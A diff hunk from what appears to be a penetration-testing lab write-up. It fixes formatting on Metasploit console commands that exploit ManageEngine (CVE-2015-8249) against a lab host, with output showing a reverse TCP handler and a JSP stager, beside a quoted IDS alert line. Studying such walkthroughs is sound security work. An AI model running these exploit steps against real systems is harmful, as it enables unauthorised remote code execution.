@@ -146,10 +146,10 @@ In the case of systems based solely on open source I would argue that it is alwa
 * POLICY-OTHER HP Universal CMDB server axis2 service upload attempt [**] [Classification: Attempted Administrator Privilege Gain]
 # 8. Exploiting ManageEngine (CVE-2015-8249)
 8.1 msfconsole
-* ` msf > use exploit/windows/http/manageengine_connectionid_write
-* ` msf exploit(manageengine_connectionid_write) > set RHOST 192.168.78.2
-* ` msf exploit(manageengine_connectionid_write) > set RPORT 8022
-* ` msf exploit(manageengine_connectionid_write) > exploit
+* ` msf > use exploit/windows/http/manageengine_connectionid_write `
+* ` msf exploit(manageengine_connectionid_write) > set RHOST 192.168.78.2 `
+* ` msf exploit(manageengine_connectionid_write) > set RPORT 8022 `
+* ` msf exploit(manageengine_connectionid_write) > exploit `
 
 * [*] Started reverse TCP handler on 172.28.128.1:4444
 * [*] Creating JSP stager
